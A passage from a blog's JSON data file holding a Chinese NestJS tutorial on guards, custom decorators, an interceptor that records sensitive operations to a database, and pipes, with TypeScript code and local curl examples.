{\"statusCode\":401,\"message\":\"need user to distinct\",\"error\":\"Unauthorized\"}%  \n\n// ✅ 使用 user\n// curl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx\", \"name\": \"gdccwxx\"}'\n// => Im student gdccwxx%\n```\n\n## 全局使用\n\n全局使用仅需在 `app.module.ts` 的 `providers` 中引入。这样就对全局生效了\n```ts\nimport { APP_GUARD } from '@nestjs/core';\nimport { UserGuard } from './common/guards/user.guard';\n// ...\n\n@Module({\n  controllers: [AppController],\n  providers: [\n    {\n      provide: APP_GUARD,\n      useClass: UserGuard,\n    },\n      AppService\n  ],\n  // ...\n})\nexport class AppModule {}\n\n```\n\n这时再访问 `get` 请求 `who-are-you` 和 `post` 请求 `who-is-request`\n```bash\n// ❌ get who-are-you\nhttp://localhost:3000/students/who-are-you?name=gdccwxx\n// => {\n// statusCode: 401,\n// message: \"need user field\",\n// error: \"Unauthorized\"\n// }\n\n// ✅ post \ncurl -X POST http://127.0.0.1:3000/students/who-is-request -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx\"}'\n// => gdccwxx%\n```\n\n## 自定义装饰器过滤\n总有些接口我们不需要有 `user` 字段，这时自定义 `decorator` 就出马了。\n\n基本原理是：在接口前设置 MetaData, 在服务启动时把 MetaData 写入内存，这样在请求过来时判断有无 MetaData 标签。有则通过，无则校验。\n\n顺便也将 `get` 请求类型过滤掉。\n\n```ts\n// common/decorators.ts\nexport const NoUser = () => SetMetadata('no-user', true);\n```\n\n`user.guard.ts` 改造\n\n```ts\n// user.guard.ts\nimport { Reflector } from '@nestjs/core';\n// ..\n\n@Injectable()\nexport class UserGuard implements CanActivate {\n  constructor(private reflector: Reflector) {}\n\n  canActivate(\n    context: ExecutionContext,\n  ): boolean | Promise<boolean> | Observable<boolean> {\n    const request = context.switchToHttp().getRequest();\n    const user = request.body.user;\n\n    if (request.method !== 'POST') {\n        return true;\n    }\n\n    const noCheck = this.reflector.get<string[]>('no-user', context.getHandler());\n\n    if (noCheck) {\n        return true;\n    }\n\n    if (user) {\n        return true;\n    }\n\n    throw new UnauthorizedException('need user field');\n  }\n}\n```\n\n`NoUser` 使用\n```ts\n// students.controller.ts\nimport { User, NoUser } from '../common/decorators';\n// ..\n\n@Controller('students')\nexport class StudentsController {\n    // ...\n    @NoUser()\n    @Post('who-are-you')\n    whoAreYouPost(@Body() student: StudentDto) {\n        return this.studentsService.ImStudent(student.name);\n    }\n}\n\n```\n\n再调用时，就不会再校验了。\n\n```bash\n// ✅\ncurl -X POST http://127.0.0.1:3000/students/who-are-you -H 'Content-Type: application/json' -d '{\"name\": \"gdccwxx\"}'\n// => Im student gdccwxx%\n```\n\n这样就实现了全局守卫，但是部分接口不需要守卫的情况。\n\n特别适用于登录态的校验，只有登陆接口不需要登录态，其他接口都需要登陆态或鉴权。\n\n# 拦截器 Interceptors\n![interceptors](interceptors.png)\n\n拦截器工作在 `请求前` 和 `响应后`。它的原理和 `decorator` 类似，不同的是能做全局级别。\n\n它的应用场景也非常广，例如：接口请求参数和请求结果的数据保存、设计模式中的 adapter 模式 等...\n\n我们来用它实现敏感信息的数据保存。\n\n它的原理和 `guards` 类似, 通过 `decorator` 加载到内存，知道哪些接口需要敏感操作记录，然后在调用接口时将 入参和结果存入。\n\n涉及到数据库操作，因此需要新增模块和数据库连接。\n\n## 新建敏感权限模块\n新建敏感权限模块，包括 controller、module 和 service\n```bash\nnest g controller sensitive\nnest g module sensitive\nnest g service sensitive\n```\n\n## 创建 entity 文件\n新建 `sensitive.entity.ts` 。\n\n这里会用到 `transformer`, 原因是 `mysql` 底层并没有 `Object` 类型。需要通过 JS 把它存成 `string` 格式，在读取时用 `object` 格式。这样代码就不需要感知是啥类型了。\n\n```ts\nimport { Entity, Column, PrimaryGeneratedColumn, CreateDateColumn } from 'typeorm';\nimport { SensitiveType } from '../constants';\n\n// to 写入数据库\n// from 从数据库读取\nconst dataTransform = {\n    to: (value: any) => JSON.stringify(value || {}),\n    from: (value: any) => JSON.parse(value)\n}\n\n@Entity()\nexport class Sensitive {\n  @PrimaryGeneratedColumn()\n  id: number;\n\n  @Column({ type: 'enum', enum: SensitiveType })\n  type: string;\n\n  @Column({ type: 'varchar' })\n  pathname: string;\n\n  @Column({ type: 'text', transformer: dataTransform })\n  parameters: any;\n\n  @Column({ type: 'text', transformer: dataTransform })\n  results: any;\n\n  @CreateDateColumn()\n  createDate: Date;\n}\n```\n\n## 引用数据库\n和之前介绍数据库一样，在 `sensitive.module.ts` 中引入数据库\n```ts\nimport { Module } from '@nestjs/common';\nimport { SensitiveController } from './sensitive.controller';\nimport { SensitiveService } from './sensitive.service';\nimport { Sensitive } from './entities/sensitive.entity';\nimport { TypeOrmModule } from '@nestjs/typeorm';\n\n@Module({\n  controllers: [SensitiveController],\n  imports: [TypeOrmModule.forFeature([Sensitive])],\n  providers: [Sensitive, SensitiveService],\n  exports: [SensitiveService],\n})\nexport class SensitiveModule {}\n```\n\n## service 核心逻辑\n\n敏感操作比较简单，service 仅需实现新增和查询。\n\n先定义敏感操作类型\n```ts\n// src/sensitive/constants.ts\nexport enum SensitiveType {\n    Modify = 'Modify',\n    Set = 'Set',\n    Create = 'Create',\n    Delete = 'Delete',\n}\n```\n\n在修改 service，引入db操作\n\n```ts\n// src/sensitive/sensitive.service.ts\nimport { Injectable } from '@nestjs/common';\nimport { Sensitive } from './entities/sensitive.entity';\nimport { InjectRepository } from '@nestjs/typeorm';\nimport { Repository } from 'typeorm';\nimport { SensitiveType } from './constants';\n\n@Injectable()\nexport class SensitiveService {\n    constructor(\n        @InjectRepository(Sensitive)\n        private readonly sensitiveRepository: Repository<Sensitive>,\n    ) {}\n\n    async setSensitive(type: SensitiveType, pathname: string, parameters: any, results: any) {\n        return await this.sensitiveRepository.save({\n            type,\n            pathname,\n            parameters,\n            results,\n        }).catch(e => e);\n    }\n\n    async getSensitive(type: SensitiveType) {\n        return await this.sensitiveRepository.find({ \n            where: {\n                type,\n            }\n        });\n    }\n}\n```\n\n## controller 修改\ncontroller 比较简单，只需要简单的查询即可。敏感信息写入则是通过 decorator + interceptor 来实现\n\n```ts\n// src/sensitive/sensitive.controller.ts\nimport { Controller, Get, Query } from '@nestjs/common';\nimport { SensitiveService } from './sensitive.service';\nimport { SensitiveType } from './constants';\n\n@Controller('sensitive')\nexport class SensitiveController {\n    constructor(private readonly sensitiveService: SensitiveService) {}\n\n    @Get('/get-by-type')\n    getSensitive(@Query('type') type: SensitiveType) {\n        return this.sensitiveService.getSensitive(type);\n    }\n}\n```\n## 新增装饰器\n装饰器的用场来了，只需要告诉某个接口需要敏感操作记录，并指定类型即可。\n\n```ts\n// src/common/decorators\nimport { SetMetadata } from '@nestjs/common';\nimport { SensitiveType } from '../sensitive/constants';\n\nexport const SensitiveOperation = (type: SensitiveType) => SetMetadata('sensitive-operation', type);\n// ...\n```\n\n通过传参的方式，定义敏感操作的类型。在数据库中可以分类，通过索引的方式查找修改入参和结果。\n\n## 拦截器\n重点来了！！\n\n和守卫权限校验类似，通过 `reflector` 取出内存中的 sensitive-operation 类型。\n\n新建 `src/common/interceptors/sensitive.interceptor.ts`\n\n```ts\n// src/common/interceptors/sensitive.interceptor.ts\nimport { Injectable, NestInterceptor, ExecutionContext, CallHandler } from '@nestjs/common';\nimport { Reflector } from '@nestjs/core';\nimport { SensitiveService } from '../../sensitive/sensitive.service';\nimport { SensitiveType } from '../../sensitive/constants';\nimport { Observable } from 'rxjs';\nimport { tap } from 'rxjs/operators';\n\n@Injectable()\nexport class SensitiveInterceptor implements NestInterceptor {\n  constructor(private reflector: Reflector, private sensitiveService: SensitiveService) {}\n\n  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {\n    const request = context.switchToHttp().getRequest();\n\n    const type = this.reflector.get<SensitiveType | undefined>('sensitive-operation', context.getHandler());\n\n    if (!type) {\n        return  next.handle();\n    }\n\n    return next\n      .handle()\n      .pipe(\n        tap((data) => this.sensitiveService.setSensitive(type, request.url, request.body, data)),\n      );\n  }\n}\n\n```\n\n并在 app.module.ts 中引入全局。\n```ts\n// app.module.ts\nimport { APP_GUARD, APP_INTERCEPTOR } from '@nestjs/core';\nimport { SensitiveInterceptor } from './common/interceptors/sensitive.interceptor';\n// ...\n\n@Module({\n  providers: [\n    {\n      provide: APP_INTERCEPTOR,\n      useClass: SensitiveInterceptor,\n    },\n    // ...\n  ],\n  // ...\n})\nexport class AppModule { }\n\n```\n\n## 其他模块引用\nstudent 模块引入\n```ts\n// src/students/students.controller.ts\nimport { SensitiveOperation } from '../common/decorators';\nimport { SensitiveType } from '../sensitive/constants';\n// ...\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n\n    @SensitiveOperation(SensitiveType.Set)\n    @Post('set-student-name')\n    setStudentName(@User() user: string) {\n        return this.studentsService.setStudent(user);\n    }\n    // ...\n}\n\n```\n\n仅需要在接口前引入 `@SensitiveOperation(SensitiveType.Set)` 即可！是不是非常优美。\n\n再来调用下！\n```bash\n// ✅ 使用命令行调用\ncurl -X POST http://127.0.0.1:3000/students/set-student-name -H 'Content-Type: application/json' -d '{\"user\": \"gdccwxx1\"}'\n// => {\"name\":\"gdccwxx1\",\"id\":3,\"updateDate\":\"2021-09-17T05:48:41.685Z\",\"createDate\":\"2021-09-17T05:48:41.685Z\"}%\n\n// ✅ 打开浏览器\nhttp://localhost:3000/sensitive/get-by-type?type=set\n// => [{\n//  id: 1,\n//  type: \"Set\",\n//  pathname: \"/students/set-student-name\",\n//  parameters: { user: \"gdccwxx1\" },\n//  results: { name: \"gdccwxx1\", id: 3, updateDate: \"2021-09-17T05:48:41.685Z\", createDate: \"2021-09-17T05:48:41.685Z\" },\n//  createDate: \"2021-09-17T05:48:41.719Z\"\n// }]\n```\n\nbingo！这样就达到了我们想要的目的！\n\n在不影响原有业务逻辑的情况下，仅是在接口处做标识的简单调用。实现了 `AOP` 的调用方式。对老代码的改造和新业务的编写都十分有用。\n\n\n# 管道 Pipes\n![pipes](pipes.png)\nNestJs `Pipes` 的概念和 linux `shell` 的概念非常相似，都是通过前者的输出再做一些事情。\n\n它的应用场景也非常广，例如：数据转化，数据校验等...\n\n对数据输入时的操作非常有用。对复杂数据校验，例如表单数据等十分有用。\n\n我们没有复杂输入，我们来使用简单的数据转化，实现在名字前加上🇨🇳\n\n## 新建 Pipes\n新建 `src/common/pipes/name.pipes.ts`。\n```ts\n// src/common/pipes/name.pipes.ts\nimport { PipeTransform, Injectable, ArgumentMetadata } from '@nestjs/common';\n\n@Injectable()\nexport class TransformNamePipe implements PipeTransform {\n  transform(name: string, metadata: ArgumentMetadata) {\n    return `🇨🇳 ${name.trim()}`;\n  }\n}\n\n```\n\n和其他 NestJs 一样，都需要重载一边内置对象。`Pipes` 也需要重载 `PipeTransform`。\n\n## 使用管道\n在 `controller` 中使用 `pipes`。\n\n```ts\nimport { TransformNamePipe } from '../common/pipes/name.pipes';\n// ...\n\n@Controller('students')\nexport class StudentsController {\n    constructor(private readonly studentsService: StudentsService) {}\n  \n    @Get('who-are-you')\n    whoAreYou(@Query('name', TransformNamePipe) name: string) {\n        return this.studentsService.ImStudent(name);\n    }\n    // ...\n}\n\n```\nquery 的第二个参数是 pipes, 也可以使用多个 pipes 对数据连续处理\n\n## 调用接口\n再浏览器访问\n```bash\n// ✅\nhttp://localhost:3000/students/who-are-you?name=gdccwxx\n// => Im student 🇨🇳 gdccwxx\n```\n\n这样就实现了简单版本的数据转换了！\n\n\n# 总结\n至此，NestJs 的入门篇章就结束了。\n\n简单回顾下教程内容：\n- 通过 `nest cli` 新建工程、新建模块\n- 通过 `@Get` 和 `@Post` 实现 get、post 请求\n- 通过 `dto` 限制对参数进行限制\n- 自定义 `decorator` 实现参数获取、设置 `metadata`\n- 调用内置 `log` 实现日志规范化\n- 使用 `typeorm` 对数据库连接和基础操作，并进行联表操作及查询\n- 使用 `guard` 对参数进行校验（可扩展成登录态）\n- 使用 `interceptor` 实现敏感数据落地\n- 使用 `pipes` 实现数据格式化\n\n笔者也在 NestJs 逐渐探索中。它不仅包括简单的数据服务，还支持 `GraphQL`、`SSE`、`Microservice` 等等，是综合性非常强的框架。\n\nbtw：这是笔者用这么久以来最喜欢的 Node 框架了\n\n感谢你的阅读～","slug":"nest-js-tutorial-4","published":1,"updated":"2021-10-13T15:49:48.655Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz0700154jzx9jltxdtf","content":"<p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-4/nestjs.png\" alt=\"nestjs\"></p><a href=\"/nestJs/nest-js-tutorial-3/\" title=\"上篇\">上篇</a>文章，实现了 <code>数据库</code> 基础操作 和联表查询。<br><br>本篇是教程的最终篇，虽然我们实现了 NestJs 的基础功能，但是真正的服务器需要做全局的数据核查、敏感操作落库和数据转化。<br><br>拥有这些能力才能让后台能力更加丰富，本篇将主要使用 NestJs 的高级能力，来实现这些功能。<br><br>本篇概要：<br>- 使用 <code>guards</code> 和 <code>decorators</code> 实现数据校验核查<br>- 通过 <code>interceptors</code> 和 <code>decorators</code> 实现敏感操作录入<br>- 自定义 <code>pipes</code> 实现数据转化<br><p>完整示例可以在 <a href=\"https://github.com/gdccwxx/nest-test\" target=\"_blank\" rel=\"noopener\">github</a> 找到。</p><h1 id=\"守卫-Guards\"><a href=\"#守卫-Guards\" class=\"headerlink\" title=\"守卫 Guards\"></a>守卫 Guards</h1><p><img src=\"/img/loading.gif\" data-original=\"/nestJs/nest-js-tutorial-4/guards.png\" alt=\"guards\"><br>在 <code>请求到达业务逻辑前</code> 会经过 guard，这样在接口前可以做统一处理。</p><p>例如：检查登陆态、检查权限 …</p><p>需要在业务逻辑前 <code>统一检查</code>\b 的信息，都可以抽象成守卫。</p><p>在真实场景中，大多数的后台管理端会用 <code>JWT</code> 实现接口鉴权。<code>NestJs</code> 也提供了对应的<a href=\"https://docs.nestjs.com/security/authentication\" target=\"_blank\" rel=\"noopener\">解决方案</a>。</p><p>由于较长且原理相通，本篇暂时用校验 <code>user</code> 字段做演示。</p><h2 id=\"新建守卫\"><a href=\"#新建守卫\" class=\"headerlink\" title=\"新建守卫\"></a>新建守卫</h2><p>新建 <code>user.guard.ts</code> 文件</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/common/guards/user.guard.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Injectable, CanActivate, ExecutionContext, UnauthorizedException &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Observable &#125; <span class=\"keyword\">from</span> <span class=\"string\">'rxjs'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> UserGuard <span class=\"keyword\">implements</span> CanActivate &#123;</span><br><span class=\"line\">  canActivate(</span><br><span class=\"line\">    context: ExecutionContext,</span><br><span class=\"line\">  ): <span class=\"built_in\">boolean</span> | <span class=\"built_in\">Promise</span>&lt;<span class=\"built_in\">boolean</span>&gt; | Observable&lt;<span class=\"built_in\">boolean</span>&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> request = context.switchToHttp().getRequest();</span><br><span class=\"line\">    <span class=\"keyword\">const</span> user = request.body.user;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (user) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UnauthorizedException(<span class=\"string\">'need user field'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><h2 id=\"单个接口使用守卫\"><a href=\"#单个接口使用守卫\" class=\"headerlink\" title=\"单个接口使用守卫\"></a>单个接口使用守卫</h2><p>单个接口使用需要用 <code>@UseGuards</code> 作为引用。再将定义的 <code>UserGuard</code> 作为入参。</p><p>\b在 <code>student.controller.ts</code> 中使用<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123;  UseGuards  <span class=\"comment\">/** ... **/</span>&#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/common'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; UserGuard &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/guards/user.guard'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> readonly studentsService: StudentsService</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@UseGuards</span>(UserGuard)</span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYouPost(<span class=\"meta\">@Body</span>() student: StudentDto) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(student.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>这样当访问 <code>who-are-you</code> 和 <code>who-is-request</code> 就起作用了<br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 不使用 user</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"name\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; &#123;<span class=\"string\">\"statusCode\"</span>:401,<span class=\"string\">\"message\"</span>:<span class=\"string\">\"need user to distinct\"</span>,<span class=\"string\">\"error\"</span>:<span class=\"string\">\"Unauthorized\"</span>&#125;%  </span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 使用 user</span><br><span class=\"line\">// curl -X POST http://127.0.0.1:3000/students/who-are-you -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx\", \"name\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; Im student gdccwxx%</span><br></pre></td></tr></table></figure><p></p><h2 id=\"全局使用\"><a href=\"#全局使用\" class=\"headerlink\" title=\"全局使用\"></a>全局使用</h2><p>全局使用仅需在 <code>app.module.ts</code> 的 <code>providers</code> 中引入。这样就对全局生效了<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; APP_GUARD &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; UserGuard &#125; <span class=\"keyword\">from</span> <span class=\"string\">'./common/guards/user.guard'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Module</span>(&#123;</span><br><span class=\"line\">  controllers: [AppController],</span><br><span class=\"line\">  providers: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      provide: APP_GUARD,</span><br><span class=\"line\">      useClass: UserGuard,</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">      AppService</span><br><span class=\"line\">  ],</span><br><span class=\"line\">  <span class=\"comment\">// ...</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> AppModule &#123;&#125;</span><br></pre></td></tr></table></figure><p></p><p>这时再访问 <code>get</code> 请求 <code>who-are-you</code> 和 <code>post</code> 请求 <code>who-is-request</code><br></p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ get who-are-you</span><br><span class=\"line\">http://localhost:3000/students/who-are-you?name=gdccwxx</span><br><span class=\"line\">// =&gt; &#123;</span><br><span class=\"line\">// statusCode: 401,</span><br><span class=\"line\">// message: <span class=\"string\">\"need user field\"</span>,</span><br><span class=\"line\">// error: <span class=\"string\">\"Unauthorized\"</span></span><br><span class=\"line\">// &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ post </span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-is-request -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"user\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; gdccwxx%</span><br></pre></td></tr></table></figure><p></p><h2 id=\"自定义装饰器过滤\"><a href=\"#自定义装饰器过滤\" class=\"headerlink\" title=\"自定义装饰器过滤\"></a>自定义装饰器过滤</h2><p>总有些接口我们不需要有 <code>user</code> 字段，这时自定义 <code>decorator</code> 就出马了。</p><p>基本原理是：在接口前设置 MetaData, 在服务启动时把 MetaData 写入内存，这样在请求过来时判断有无 MetaData 标签。有则通过，无则校验。</p><p>顺便也将 <code>get</code> 请求类型过滤掉。</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// common/decorators.ts</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">const</span> NoUser = <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> SetMetadata(<span class=\"string\">'no-user'</span>, <span class=\"literal\">true</span>);</span><br></pre></td></tr></table></figure><p><code>user.guard.ts</code> 改造</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// user.guard.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; Reflector &#125; <span class=\"keyword\">from</span> <span class=\"string\">'@nestjs/core'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ..</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Injectable</span>()</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> UserGuard <span class=\"keyword\">implements</span> CanActivate &#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(<span class=\"params\"><span class=\"keyword\">private</span> reflector: Reflector</span>) &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  canActivate(</span><br><span class=\"line\">    context: ExecutionContext,</span><br><span class=\"line\">  ): <span class=\"built_in\">boolean</span> | <span class=\"built_in\">Promise</span>&lt;<span class=\"built_in\">boolean</span>&gt; | Observable&lt;<span class=\"built_in\">boolean</span>&gt; &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> request = context.switchToHttp().getRequest();</span><br><span class=\"line\">    <span class=\"keyword\">const</span> user = request.body.user;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (request.method !== <span class=\"string\">'POST'</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> noCheck = <span class=\"keyword\">this</span>.reflector.get&lt;<span class=\"built_in\">string</span>[]&gt;(<span class=\"string\">'no-user'</span>, context.getHandler());</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (noCheck) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (user) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> UnauthorizedException(<span class=\"string\">'need user field'</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p><code>NoUser</code> 使用<br></p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// students.controller.ts</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; User, NoUser &#125; <span class=\"keyword\">from</span> <span class=\"string\">'../common/decorators'</span>;</span><br><span class=\"line\"><span class=\"comment\">// ..</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span>(<span class=\"string\">'students'</span>)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> StudentsController &#123;</span><br><span class=\"line\">    <span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"meta\">@NoUser</span>()</span><br><span class=\"line\">    <span class=\"meta\">@Post</span>(<span class=\"string\">'who-are-you'</span>)</span><br><span class=\"line\">    whoAreYouPost(<span class=\"meta\">@Body</span>() student: StudentDto) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.studentsService.ImStudent(student.name);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><p></p><p>再调用时，就不会再校验了。</p><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅</span><br><span class=\"line\">curl -X POST http://127.0.0.1:3000/students/who-are-you -H <span class=\"string\">'Content-Type: application/json'</span> -d <span class=\"string\">'&#123;\"name\": \"gdccwxx\"&#125;'</span></span><br><span class=\"line\">// =&gt; Im student gdccwxx%</span><br></pre></td></tr></table></figure><p>这样就实现了全局守卫，但是部分接口不需要守卫的情况。</p><p>特别适用于登录态的校验，只有登陆接口不需要登录态，其他接口都需要登陆态或鉴权。</p><h1 id=\"拦截器-Interceptors\"><a 